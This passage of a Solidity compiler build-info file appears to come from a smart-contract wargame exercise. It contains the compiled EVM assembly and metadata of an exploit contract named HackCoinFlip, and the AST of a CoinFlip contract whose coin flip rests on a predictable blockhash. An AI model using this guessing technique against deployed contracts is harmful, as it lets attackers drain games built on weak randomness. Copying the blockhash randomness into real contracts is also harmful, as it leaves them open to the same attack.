											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1861,
											"end": 1877,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1851,
											"end": 1883,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1851,
											"end": 1883,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1851,
											"end": 1883,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1851,
											"end": 1883,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1889,
											"end": 2045,
											"name": "tag",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 1889,
											"end": 2045,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1889,
											"end": 2045,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1987,
											"end": 2039,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "63"
										},
										{
											"begin": 2033,
											"end": 2038,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1987,
											"end": 2039,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "64"
										},
										{
											"begin": 1987,
											"end": 2039,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1987,
											"end": 2039,
											"name": "tag",
											"source": 2,
											"value": "63"
										},
										{
											"begin": 1987,
											"end": 2039,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1974,
											"end": 2039,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1974,
											"end": 2039,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1964,
											"end": 2045,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1964,
											"end": 2045,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1964,
											"end": 2045,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1964,
											"end": 2045,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 2051,
											"end": 2179,
											"name": "tag",
											"source": 2,
											"value": "64"
										},
										{
											"begin": 2051,
											"end": 2179,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2051,
											"end": 2179,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2149,
											"end": 2173,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "66"
										},
										{
											"begin": 2167,
											"end": 2172,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2149,
											"end": 2173,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "59"
										},
										{
											"begin": 2149,
											"end": 2173,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 2149,
											"end": 2173,
											"name": "tag",
											"source": 2,
											"value": "66"
										},
										{
											"begin": 2149,
											"end": 2173,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2136,
											"end": 2173,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2136,
											"end": 2173,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2126,
											"end": 2179,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2126,
											"end": 2179,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2126,
											"end": 2179,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2126,
											"end": 2179,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 2185,
											"end": 2365,
											"name": "tag",
											"source": 2,
											"value": "57"
										},
										{
											"begin": 2185,
											"end": 2365,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2233,
											"end": 2310,
											"name": "PUSH",
											"source": 2,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 2230,
											"end": 2231,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2223,
											"end": 2311,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 2330,
											"end": 2334,
											"name": "PUSH",
											"source": 2,
											"value": "11"
										},
										{
											"begin": 2327,
											"end": 2328,
											"name": "PUSH",
											"source": 2,
											"value": "4"
										},
										{
											"begin": 2320,
											"end": 2335,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 2354,
											"end": 2358,
											"name": "PUSH",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 2351,
											"end": 2352,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2344,
											"end": 2359,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 2371,
											"end": 2551,
											"name": "tag",
											"source": 2,
											"value": "51"
										},
										{
											"begin": 2371,
											"end": 2551,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2419,
											"end": 2496,
											"name": "PUSH",
											"source": 2,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 2416,
											"end": 2417,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2409,
											"end": 2497,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 2516,
											"end": 2520,
											"name": "PUSH",
											"source": 2,
											"value": "12"
										},
										{
											"begin": 2513,
											"end": 2514,
											"name": "PUSH",
											"source": 2,
											"value": "4"
										},
										{
											"begin": 2506,
											"end": 2521,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 2540,
											"end": 2544,
											"name": "PUSH",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 2537,
											"end": 2538,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2530,
											"end": 2545,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 2557,
											"end": 2673,
											"name": "tag",
											"source": 2,
											"value": "29"
										},
										{
											"begin": 2557,
											"end": 2673,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2627,
											"end": 2648,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "70"
										},
										{
											"begin": 2642,
											"end": 2647,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2627,
											"end": 2648,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "36"
										},
										{
											"begin": 2627,
											"end": 2648,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 2627,
											"end": 2648,
											"name": "tag",
											"source": 2,
											"value": "70"
										},
										{
											"begin": 2627,
											"end": 2648,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2620,
											"end": 2625,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2617,
											"end": 2649,
											"name": "EQ",
											"source": 2
										},
										{
											"begin": 2607,
											"end": 2609,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "71"
										},
										{
											"begin": 2607,
											"end": 2609,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 2663,
											"end": 2664,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2660,
											"end": 2661,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 2653,
											"end": 2665,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 2607,
											"end": 2609,
											"name": "tag",
											"source": 2,
											"value": "71"
										},
										{
											"begin": 2607,
											"end": 2609,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2597,
											"end": 2673,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2597,
											"end": 2673,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"coinFlipContract()": "53b3b3b3",
							"makeGuess()": "931c9f32"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.0+commit.c7dfd78e\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_coinFlipContract\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"coinFlipContract\",\"outputs\":[{\"internalType\":\"contract CoinFlip\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"makeGuess\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/hackcoinflip.sol\":\"HackCoinFlip\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/coinflip.sol\":{\"keccak256\":\"0x83b137afee61967a9974d44c902623ac57a190258d54c83c31ef7112ef2d3341\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://6b3bafc899ce6bb08099abcd5251a57a0503d48faec36ebd535008d860b65f61\",\"dweb:/ipfs/QmP7mArHd1H8JtchbUnxc88g5bWt7yT1cPEB4ueuLTwyyy\"]},\"contracts/hackcoinflip.sol\":{\"keccak256\":\"0x577a89cdb8db9f3ff17a2eeb797cbdb05074ef0e0306e293a9412f482980e168\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://bc2dbcc5bfea6b49f4bfa382248cd2bc7a68cefe94bd98fdd177b8fa4017a23b\",\"dweb:/ipfs/QmWt9W9aZaF1K5Fvih4GxfszUz4rYqLbUGWzBY4KDqMBfJ\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 87,
								"contract": "contracts/hackcoinflip.sol:HackCoinFlip",
								"label": "coinFlipContract",
								"offset": 0,
								"slot": "0",
								"type": "t_contract(CoinFlip)81"
							},
							{
								"astId": 90,
								"contract": "contracts/hackcoinflip.sol:HackCoinFlip",
								"label": "FACTOR",
								"offset": 0,
								"slot": "1",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_contract(CoinFlip)81": {
								"encoding": "inplace",
								"label": "contract CoinFlip",
								"numberOfBytes": "20"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"errorCode": "2462",
				"formattedMessage": "Warning: Visibility for constructor is ignored. If you want the contract to be non-deployable, making it \"abstract\" is sufficient.\n  --> contracts/coinflip.sol:11:3:\n   |\n11 |   constructor() public {\n   |   ^ (Relevant source part starts here and spans across multiple lines).\n\n",
				"message": "Visibility for constructor is ignored. If you want the contract to be non-deployable, making it \"abstract\" is sufficient.",
				"severity": "warning",
				"sourceLocation": {
					"end": 297,
					"file": "contracts/coinflip.sol",
					"start": 244
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"errorCode": "2462",
				"formattedMessage": "Warning: Visibility for constructor is ignored. If you want the contract to be non-deployable, making it \"abstract\" is sufficient.\n  --> contracts/hackcoinflip.sol:10:5:\n   |\n10 |     constructor(address _coinFlipContract) public{\n   |     ^ (Relevant source part starts here and spans across multiple lines).\n\n",
				"message": "Visibility for constructor is ignored. If you want the contract to be non-deployable, making it \"abstract\" is sufficient.",
				"severity": "warning",
				"sourceLocation": {
					"end": 368,
					"file": "contracts/hackcoinflip.sol",
					"start": 258
				},
				"type": "Warning"
			}
		],
		"sources": {
			"contracts/coinflip.sol": {
				"ast": {
					"absolutePath": "contracts/coinflip.sol",
					"exportedSymbols": {
						"CoinFlip": [
							81
						]
					},
					"id": 82,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 81,
							"linearizedBaseContracts": [
								81
							],
							"name": "CoinFlip",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "e6f334d7",
									"id": 3,
									"mutability": "mutable",
									"name": "consecutiveWins",
									"nodeType": "VariableDeclaration",
									"scope": 81,
									"src": "87:30:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 2,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "87:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 5,
									"mutability": "mutable",
									"name": "lastHash",
									"nodeType": "VariableDeclaration",
									"scope": 81,
									"src": "122:16:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 4,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "122:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 8,
									"mutability": "mutable",
									"name": "FACTOR",
									"nodeType": "VariableDeclaration",
									"scope": 81,
									"src": "143:94:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 6,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "143:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"hexValue": "3537383936303434363138363538303937373131373835343932353034333433393533393236363334393932333332383230323832303139373238373932303033393536353634383139393638",
										"id": 7,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "160:77:0",
										"typeDescriptions": {
											"typeIdentifier": "t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1",
											"typeString": "int_const 5789...(69 digits omitted)...9968"
										},
										"value": "57896044618658097711785492504343953926634992332820282019728792003956564819968"
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 15,
										"nodeType": "Block",
										"src": "265:32:0",
										"statements": [
											{
												"expression": {
													"id": 13,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 11,
														"name": "consecutiveWins",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 3,
														"src": "272:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"hexValue": "30",
														"id": 12,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "290:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "272:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 14,
												"nodeType": "ExpressionStatement",
												"src": "272:19:0"
											}
										]
									},
									"id": 16,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 9,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "255:2:0"
									},
									"returnParameters": {
										"id": 10,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "265:0:0"
									},
									"scope": 81,
									"src": "244:53:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 79,
										"nodeType": "Block",
										"src": "352:396:0",
										"statements": [
											{
												"assignments": [
													24
												],
												"declarations": [
													{
														"constant": false,
														"id": 24,
														"mutability": "mutable",
														"name": "blockValue",
														"nodeType": "VariableDeclaration",
														"scope": 79,
														"src": "359:18:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 23,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "359:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 34,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 31,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"expression": {
																			"id": 28,
																			"name": "block",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 4294967292,
																			"src": "398:5:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_block",
																				"typeString": "block"
																			}
																		},
																		"id": 29,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "number",
																		"nodeType": "MemberAccess",
																		"src": "398:12:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"hexValue": "31",
																		"id": 30,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "412:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_1_by_1",
																			"typeString": "int_const 1"
																		},
																		"value": "1"
																	},
																	"src": "398:15:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 27,
																"name": "blockhash",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967291,
																"src": "388:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_blockhash_view$_t_uint256_$returns$_t_bytes32_$",
																	"typeString": "function (uint256) view returns (bytes32)"
																}
															},
															"id": 32,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "388:27:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														],
														"id": 26,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "380:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_uint256_$",
															"typeString": "type(uint256)"
														},
														"typeName": {
															"id": 25,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "380:7:0",
															"typeDescriptions": {}
														}
													},
													"id": 33,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "380:36:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "359:57:0"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 37,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 35,
														"name": "lastHash",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 5,
														"src": "429:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"id": 36,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 24,
														"src": "441:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "429:22:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 42,
												"nodeType": "IfStatement",
												"src": "425:53:0",
												"trueBody": {
													"id": 41,
													"nodeType": "Block",
													"src": "453:25:0",
													"statements": [
														{
															"expression": {
																"arguments": [],
																"expression": {
																	"argumentTypes": [],
																	"id": 38,
																	"name": "revert",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [
																		4294967277,
																		4294967277
																	],
																	"referencedDeclaration": 4294967277,
																	"src": "462:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_revert_pure$__$returns$__$",
																		"typeString": "function () pure"
																	}
																},
																"id": 39,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "462:8:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 40,
															"nodeType": "ExpressionStatement",
															"src": "462:8:0"
														}
													]
												}
											},
											{
												"expression": {
													"id": 45,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 43,
														"name": "lastHash",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 5,
														"src": "486:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 44,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 24,
														"src": "497:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "486:21:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 46,
												"nodeType": "ExpressionStatement",
												"src": "486:21:0"
											},
											{
												"assignments": [
													48
												],
												"declarations": [
													{
														"constant": false,
														"id": 48,
														"mutability": "mutable",
														"name": "coinFlip",
														"nodeType": "VariableDeclaration",
														"scope": 79,
														"src": "514:16:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 47,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "514:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 52,
												"initialValue": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 51,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 49,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 24,
														"src": "533:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"id": 50,
														"name": "FACTOR",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 8,
														"src": "544:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "533:17:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "514:36:0"
											},
											{
												"assignments": [
													54
												],
												"declarations": [
													{
														"constant": false,
														"id": 54,
														"mutability": "mutable",
														"name": "side",
														"nodeType": "VariableDeclaration",
														"scope": 79,
														"src": "557:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 53,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "557:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 61,
												"initialValue": {
													"condition": {
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 57,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"id": 55,
															"name": "coinFlip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 48,
															"src": "569:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "==",
														"rightExpression": {
															"hexValue": "31",
															"id": 56,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "581:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_1_by_1",
																"typeString": "int_const 1"
															},
															"value": "1"
														},
														"src": "569:13:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseExpression": {
														"hexValue": "66616c7365",
														"id": 59,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "592:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "false"
													},
													"id": 60,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "Conditional",
													"src": "569:28:0",
													"trueExpression": {
														"hexValue": "74727565",
														"id": 58,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "585:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "true"
													},
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "557:40:0"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"id": 64,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 62,
														"name": "side",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 54,
														"src": "610:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"id": 63,
														"name": "_guess",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 18,
														"src": "618:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "610:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"id": 77,
													"nodeType": "Block",
													"src": "686:57:0",
													"statements": [
														{
															"expression": {
																"id": 73,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"id": 71,
																	"name": "consecutiveWins",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 3,
																	"src": "695:15:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"hexValue": "30",
																	"id": 72,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "713:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "695:19:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 74,
															"nodeType": "ExpressionStatement",
															"src": "695:19:0"
														},
														{
															"expression": {
																"hexValue": "66616c7365",
																"id": 75,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "730:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															"functionReturnParameters": 22,
															"id": 76,
															"nodeType": "Return",
															"src": "723:12:0"
														}
													]
												},
												"id": 78,
												"nodeType": "IfStatement",
												"src": "606:137:0",
												"trueBody": {
													"id": 70,
													"nodeType": "Block",
													"src": "626:54:0",
													"statements": [
														{
															"expression": {
																"id": 66,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "UnaryOperation",
																"operator": "++",
																"prefix": false,
																"src": "635:17:0",
																"subExpression": {
																	"id": 65,
																	"name": "consecutiveWins",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 3,
																	"src": "635:15:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 67,
															"nodeType": "ExpressionStatement",
															"src": "635:17:0"
														},
														{
															"expression": {
																"hexValue": "74727565",
																"id": 68,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
